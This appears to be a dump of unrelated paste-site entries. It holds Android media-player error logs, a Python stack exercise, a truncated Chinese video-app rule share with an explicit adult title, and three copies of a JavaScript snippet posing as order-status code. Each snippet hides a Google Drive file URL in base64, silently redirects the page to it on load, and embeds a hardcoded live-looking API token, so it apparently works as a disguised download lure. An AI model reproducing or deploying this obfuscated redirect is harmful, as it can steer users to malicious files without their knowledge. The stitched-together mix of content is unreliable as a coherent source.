 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":360970007,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
pYBDXzDf,2025-04-18T16:37:28.400128,powerampache,PHP,Friday 18th of April 2025 09:37:28 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException
	at androidx.media3.datasource.DefaultHttpDataSource.skipFully(DefaultHttpDataSource.java:744)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:455)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2008. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2008,""extras"":{""mMap"":{}},""timestampMs"":360969682,""cause"":{""dataSpec"":{""absoluteStreamPosition"":484630,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":484630,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":744,""methodName"":""skipFully""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":455,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":46},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2008,""extras"":{""mMap"":{}},""timestampMs"":360969682,""cause"":{""dataSpec"":{""absoluteStreamPosition"":484630,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":484630,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":744,""methodName"":""skipFully""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":455,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
pte6KmGV,Order.js,Epiphemeral,JavaScript,Friday 18th of April 2025 09:30:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12744/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hyz6DnhG,Market.js,Epiphemeral,JavaScript,Friday 18th of April 2025 09:15:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47004/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mSktqE6S,A20250417b_google_lexographicMax,Kali_prasad,Python,Friday 18th of April 2025 09:02:47 AM CDT,"'''
A20250417b_google_lexographicMax

find the lexographically max subsequence that can be formed from the string but the 
twist each character in it should be unique

======================================================
important thing to be noted here is

first we need to understand the lexographic maximum

say abc

with this max string we can form is c 

lets take cabcab

with this you can form cb

did you observe something there is some monotonocity in this

if you find monotonocity we can use kumar sir's stack approach

lets take a stack

traverse from left to right

for each character pop out while curr>=top (each char should be unique so that's why eliminating equals even)

at last put it on top 




=======================================================
input - 
abzdczzc

output - 
zc

'''

arr = list(input())
stack = []
for charr in arr:
    # print('charr is ',charr)
    while len(stack)>0 and stack[-1]<=charr:
        curr = stack.pop()
        # print('curr is ',curr)
    stack.append(charr)

final = ''
while len(stack):
    curr = stack.pop()
    final = curr+final

print(final)




"
6ZA0fnrT,Untitled,Epiphemeral,JavaScript,Friday 18th of April 2025 09:00:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19916/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kcmv7jWf,邀您一起看：PONDEMIX (雪国おまる)｜作品-帮助了一位无处可去的淫荡又纯洁女孩~她通过要求SEX来回报‼️①,xiaomianao666,JavaScript,Friday 18th of April 2025 08:58:39 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥PONDEMIX (雪国おまる)｜作品-帮助了一位无处可去的淫荡又纯洁女孩~她通过要求SEX来回报‼️①@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuWHveaVsFwiLFwicGF0aFwiOlwiaGFuc2h1XCIsXCJydWxlXCI6XCJjb25zdCBhcGl2aWV3ID0ge1xcbiAgICBjb2xvcjogKHRlc3QpID0+IHtcXG4gICAgICAgIHJldHVybiAnPGZvbnQgY29sb3I9XFxcIiNGQTcyOThcXFwiPicgKyB0ZXN0ICsgJzwvZnJvbnQ+JztcXG4gICAgfSxcXG4gICAgc3Ryb25nOiAodGVzdCkgPT4ge1xcbiAgICAgICAgcmV0dXJuICc8c3Ryb25nPicgKyB0ZXN0ICsgJzwvc3Ryb25nPic7XFxuICAgIH0sXFxuICAgIHNtYWxsOiAodGVzdCkgPT4ge1xcbiAgICAgICAgcmV0dXJuICc8c21hbGw+JyArIHRlc3QgKyAnPC9zbWFsbD4nO1xcbiAgICB9LFxcbiAgICBjZW50ZXI6ICh0ZXN0KSA9PiB7XFxuICAgICAgICByZXR1cm4gJzxwIHN0eWxlPVxcXCJ0ZXh0LWFsaWduOiBjZW50ZXI7XFxcIj4nICsgdGVzdCArICc8L3A+J1xcbiAgICB9LFxcbiAgICBiaWc6ICh0ZXN0KSA9PiB7XFxuICAgICAgICByZXR1cm4gJzxiaWc+JyArIHRlc3QgKyAnPC9iaWc+JztcXG4gICAgfSxcXG4gICAgZ3JheTogKHRlc3QpID0+IHtcXG4gICAgICAgIHJldHVybiBcXFwiPGZvbnQgY29sb3I9J2dyYXknPlxcXCIgKyB0ZXN0ICsgXFxcIjwvZm9udD5cXFwiO1xcbiAgICB9LFxcbiAgICByaWNoOiAodGVzdCkgPT4ge1xcbiAgICAgICAgcmV0dXJuIFxcXCLigJjigJjigJnigJlcXFwiICsgdGVzdDtcXG4gICAgfSxcXG4gICAgYWRkcmVzc1RhZzogKHVybCwgdGV4dCkgPT4ge1xcbiAgICAgICAgcmV0dXJuIFxcXCI8YSBocmVmPSdcXFwiICsgdXJsICsgXFxcIic+XFxcIiArIHRleHQgKyBcXFwiPC9hPlxcXCJcXG4gICAgfSxcXG4gICAgZW1wdHk6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgbGF5b3V0OiBbXSxcXG4gICAgbm9Mb2FkOiBcXFwiI25vTG9hZGluZyNcXFwiLFxcbiAgICB0aW1lc3RhbXA6ICgpID0+IE1hdGguZmxvb3IobmV3IERhdGUoKS5nZXRUaW1lKCkgLyAxMDAwKSxcXG4gICAgdDEwOiAoKSA9PiBhcGl2aWV3LnRpbWVzdGFtcCgpLnRvU3RyaW5nKCksXFxuICAgIHQxMzogKCkgPT4gYXBpdmlldy50MTAoKSArICcwMDAnLFxcbiAgICBob3N0OiBnZXRJdGVtKFxcXCJhcGlcXFwiKSxcXG4gICAgZ2V0RGF0ZXNBcnJheTogKGVuZERhdGUpID0+IHtcXG4gICAgICAgIC8vIOWwhue7k+adn+aXpeacn+Wtl+espuS4sui9rOaNouS4ukRhdGXlr7nosaFcXG4gICAgICAgIGxldCBlbmREYXRlT2JqID0gbmV3IERhdGUoZW5kRGF0ZSk7XFxuXFxuICAgICAgICAvLyDojrflj5blvZPliY3ml6XmnJ9cXG4gICAgICAgIGxldCBjdXJyZW50RGF0ZSA9IG5ldyBEYXRlKCk7XFxuXFxuICAgICAgICAvLyDliJ3lp4vljJbml6XmnJ/mlbDnu4RcXG4gICAgICAgIGxldCBkYXRlc0FycmF5ID0gW107XFxuXFxuICAgICAgICAvLyDlvqrnjq/ku47lvZPliY3ml6XmnJ/liLDnu5PmnZ/ml6XmnJ9cXG4gICAgICAgIHdoaWxlIChjdXJyZW50RGF0ZSA+PSBlbmREYXRlT2JqKSB7XFxuICAgICAgICAgICAgLy8g5bCG5pel5pyf6L2s5o2i5Li6WVlZWS1NTS1EROagvOW8j+eahOWtl+espuS4suW5tua3u+WKoOWIsOaVsOe7hFxcbiAgICAgICAgICAgIGRhdGVzQXJyYXkucHVzaChjdXJyZW50RGF0ZS50b0lTT1N0cmluZygpLnNwbGl0KCdUJylbMF0pO1xcblxcbiAgICAgICAgICAgIC8vIOWHj+WOu+S4gOWkqVxcbiAgICAgICAgICAgIGN1cnJlbnREYXRlLnNldERhdGUoY3VycmVudERhdGUuZ2V0RGF0ZSgpIC0gMSk7XFxuICAgICAgICB9XFxuICAgICAgICAvKlxcbiAgICAgICAgICAgIC8vIOWPjei9rOaVsOe7hOS7peaMiemZjeW6j+aOkuWIl+aXpeacn1xcbiAgICAgICAgICAgIGRhdGVzQXJyYXkucmV2ZXJzZSgpO1xcbiAgICAgICAgKi9cXG4gICAgICAgIHJldHVybiBkYXRlc0FycmF5O1xcbiAgICB9LFxcbiAgICBnZXRZZWFyTW9udGhBcnJheTogKGVuZERhdGUpID0+IHtcXG4gICAgICAgIGxldCBlbmREYXRlT2JqID0gbmV3IERhdGUoZW5kRGF0ZSk7XFxuICAgICAgICBsZXQgY3VycmVudERhdGUgPSBuZXcgRGF0ZSgpO1xcbiAgICAgICAgbGV0IHllYXJNb250aEFycmF5ID0gW107XFxuXFxuICAgICAgICAvLyDnoa7kv53lvZPliY3ml6XmnJ/kuI3lsI/kuo7nu5PmnZ/ml6XmnJ9cXG4gICAgICAgIGlmIChjdXJyZW50RGF0ZSA8IGVuZERhdGVPYmopIHtcXG4gICAgICAgICAgICByZXR1cm4geWVhck1vbnRoQXJyYXk7IC8vIOWmguaenOW9k+WJjeaXpeacn+Wwj+S6jue7k+adn+aXpeacn++8jOebtOaOpei/lOWbnuepuuaVsOe7hFxcbiAgICAgICAgfVxcblxcbiAgICAgICAgLy8g5b6q546v5LuO5b2T5YmN5pel5pyf5Yiw57uT5p2f5pel5pyfXFxuICAgICAgICB3aGlsZSAoY3VycmVudERhdGUgPj0gZW5kRGF0ZU9iaikge1xcbiAgICAgICAgICAgIC8vIOiOt+WPluW9k+WJjeaXpeacn+eahOW5tOWSjOaciO+8jOW5tuagvOW8j+WMluS4ulxcXCJZWVlZLU1NXFxcIuWtl+espuS4slxcbiAgICAgICAgICAgIGxldCB5ZWFyID0gY3VycmVudERhdGUuZ2V0RnVsbFllYXIoKTtcXG4gICAgICAgICAgICBsZXQgbW9udGggPSAoY3VycmVudERhdGUuZ2V0TW9udGgoKSArIDEpLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKTsgLy8g5pyI5Lu95LuOMOW8gOWni++8jOaJgOS7peWKoDHvvIzlubbkuJTnoa7kv53mmK/kuKTkvY3mlbBcXG4gICAgICAgICAgICBsZXQgeWVhck1vbnRoID0gYCR7eWVhcn0tJHttb250aH1gOyAvLyDmraPnoa7kvb/nlKjmqKHmnb/lrZfnrKbkuLJcXG5cXG4gICAgICAgICAgICAvLyDlsIblubTmnIjlrZfnrKbkuLLmt7vliqDliLDmlbDnu4RcXG4gICAgICAgICAgICB5ZWFyTW9udGhBcnJheS5wdXNoKHllYXJNb250aCk7XFxuXFxuICAgICAgICAgICAgLy8g5YeP5Y675LiA5Liq5pyIXFxuICAgICAgICAgICAgY3VycmVudERhdGUuc2V0TW9udGgoY3VycmVudERhdGUuZ2V0TW9udGgoKSAtIDEpO1xcbiAgICAgICAgfVxcblxcbiAgICAgICAgcmV0dXJuIHllYXJNb250aEFycmF5O1xcbiAgICB9LFxcbiAgICBDcnlwdG9KUzogbnVsbCwgLy8g55So5LqO5a2Y5YKoIENyeXB0b0pTIOWvueixoVxcbiAgICBpbml0Q3J5cHRvSlM6ICgpID0+IHtcXG4gICAgICAgIGlmICghYXBpdmlldy5DcnlwdG9KUykge1xcbiAgICAgICAgICAgIGV2YWwoZ2V0Q3J5cHRvSlMoKSk7IC8vIOaJp+ihjOS4gOasoSBldmFs77yM56Gu5L+dIGBDcnlwdG9KU2Ag5Y+Y6YeP6KKr5a6a5LmJXFxuICAgICAgICAgICAgYXBpdmlldy5DcnlwdG9KUyA9IENyeXB0b0pTOyAvLyDlsIYgYENyeXB0b0pTYCDnvJPlrZjliLAgYGFwaXZpZXcuQ3J5cHRvSlNgXFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIEVuY3J5cHQ6ICh3b3JkKSA9PiB7XFxuICAgICAgICBhcGl2aWV3LmluaXRDcnlwdG9KUygpOyAvLyDnoa7kv50gQ3J5cHRvSlMg5bey5Yqg6L29XFxuICAgICAgICBsZXQga2V5ID0gYXBpdmlldy5DcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFwibCpidiVaaXEwMDBCaWFvZ1xcXCIpO1xcbiAgICAgICAgbGV0IGl2ID0gYXBpdmlldy5DcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFwiODU5NzUwNjAwMjkzOTI0OVxcXCIpO1xcbiAgICAgICAgbGV0IGVuY3J5cHQgPSBhcGl2aWV3LkNyeXB0b0pTLkFFUy5lbmNyeXB0KHdvcmQsIGtleSwge1xcbiAgICAgICAgICAgIGl2OiBpdixcXG4gICAgICAgICAgICBtb2RlOiBhcGl2aWV3LkNyeXB0b0pTLm1vZGUuQ0JDLFxcbiAgICAgICAgICAgIHBhZGRpbmc6IGFwaXZpZXcuQ3J5cHRvSlMucGFkLlBrY3M3LFxcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gZW5jcnlwdC50b1N0cmluZygpOyAvLyDpu5jorqTov5Tlm54gQmFzZTY0IOe8lueggeeahOWtl+espuS4slxcbiAgICB9LFxcbiAgICBEZWNyeXB0OiAod29yZCkgPT4ge1xcbiAgICAgICAgYXBpdmlldy5pbml0Q3J5cHRvSlMoKTsgLy8g56Gu5L+dIENyeXB0b0pTIOW3suWKoOi9vVxcbiAgICAgICAgbGV0IGtleSA9IGFwaXZpZXcuQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoXFxcImwqYnYlWmlxMDAwQmlhb2dcXFwiKTtcXG4gICAgICAgIGxldCBpdiA9IGFwaXZpZXcuQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoXFxcIjg1OTc1MDYwMDI5MzkyNDlcXFwiKTtcXG4gICAgICAgIGxldCBkZWNyeXB0ID0gYXBpdmlldy5DcnlwdG9KUy5BRVMuZGVjcnlwdCh3b3JkLCBrZXksIHtcXG4gICAgICAgICAgICBpdjogaXYsXFxuICAgICAgICAgICAgbW9kZTogYXBpdmlldy5DcnlwdG9KUy5tb2RlLkNCQyxcXG4gICAgICAgICAgICBwYWRkaW5nOiBhcGl2aWV3LkNyeXB0b0pTLnBhZC5Qa2NzNyxcXG4gICAgICAgIH0pO1xcbiAgICAgICAgcmV0dXJuIGRlY3J5cHQudG9TdHJpbmcoYXBpdmlldy5DcnlwdG9KUy5lbmMuVXRmOCk7IC8vIOino+Wvhue7k+aenOi9rOaNouS4uuaWh+acrOagvOW8j1xcbiAgICB9LFxcbiAgICBEZWNyeXB0MTogKGlucHV0KSA9PiB7XFxuICAgICAgICByZXR1cm4gJChpbnB1dCkuaW1hZ2UoKCkgPT4ge1xcbiAgICAgICAgICAgIGNvbnN0IENyeXB0b1V0aWwgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vYXNzZXRzL2NyeXB0by1qYXZhLmpzXFxcIik7XFxuICAgICAgICAgICAgbGV0IGtleSA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZVVURjgoXFxcInNhSVpYYzR5TXZxMEl6NTZcXFwiKTtcXG4gICAgICAgICAgICBsZXQgaXYgPSBDcnlwdG9VdGlsLkRhdGEucGFyc2VVVEY4KFxcXCJrYkpZdEJKVUVDVDBveWpvXFxcIik7XFxuICAgICAgICAgICAgbGV0IHRleHREYXRhID0gQ3J5cHRvVXRpbC5EYXRhLnBhcnNlSW5wdXRTdHJlYW0oaW5wdXQpO1xcbiAgICAgICAgICAgIGxldCBlbmNyeXB0ZWQgPSBDcnlwdG9VdGlsLkFFUy5kZWNyeXB0KHRleHREYXRhLCBrZXksIHtcXG4gICAgICAgICAgICAgICAgbW9kZTogXFxcIkFFUy9DQkMvUEtDUzdQYWRkaW5nXFxcIixcXG4gICAgICAgICAgICAgICAgaXY6IGl2XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgcmV0dXJuIGVuY3J5cHRlZC50b0lucHV0U3RyZWFtKCk7XFxuICAgICAgICB9KVxcbiAgICB9LFxcbiAgICBnZXR0b2tlbjogKCkgPT4ge1xcbiAgICAgICAgdmFyIGh0bWwgPSBmZXRjaChhcGl2aWV3Lmhvc3QrJy92Mi41L3JlZnJlc2gvdG9rZW4nLCB7XFxuICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsXFxuICAgICAgICAgICAgICAgICd1dWlkJzogJ2M5YWQyMjFmLWI0NDUtMzlkMi04NWY1LWE2OTNjMjQxMTVlMycsXFxuICAgICAgICAgICAgICAgICd0aW1lc3RhbXAnOiBhcGl2aWV3LnQxMCgpLFxcbiAgICAgICAgICAgICAgICAnaXAnOiAnMC4wLjAuMCcsXFxuICAgICAgICAgICAgICAgICd1c2VyLWtleSc6ICc3NjAzNTVjYzg4MjE4ZjBjMTUxNGY1Njc2NDM2MjA2NicsXFxuICAgICAgICAgICAgICAgICdwbGF0Zm9ybSc6ICcxJyxcXG4gICAgICAgICAgICAgICAgJ3NpZ24nOiBtZDUobWQ1KCcwLjAuMC4wLjEuJythcGl2aWV3LnQxMCgpKycuNzYwMzU1Y2M4ODIxOGYwYzE1MTRmNTY3NjQzNjIwNjYuYzlhZDIyMWYtYjQ0NS0zOWQyLTg1ZjUtYTY5M2MyNDExNWUzJykrJ200bjJoalBlWVdrRDZ0RnBxS0ZeM0hPXmgyNFBAaWRUJyksXFxuICAgICAgICAgICAgICAgICdhcHAtdmVyc2lvbic6ICcyLjIuOScsXFxuICAgICAgICAgICAgICAgICdDb250ZW50LUxlbmd0aCc6ICcwJyxcXG4gICAgICAgICAgICAgICAgJ0hvc3QnOiBhcGl2aWV3Lmhvc3Quc3BsaXQoJy8vJylbMV0sXFxuICAgICAgICAgICAgICAgICdDb25uZWN0aW9uJzogJ0tlZXAtQWxpdmUnLFxcbiAgICAgICAgICAgICAgICAvLydBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCcsXFxuICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ29raHR0cC80LjMuMScsXFxuICAgICAgICAgICAgfSxcXG4gICAg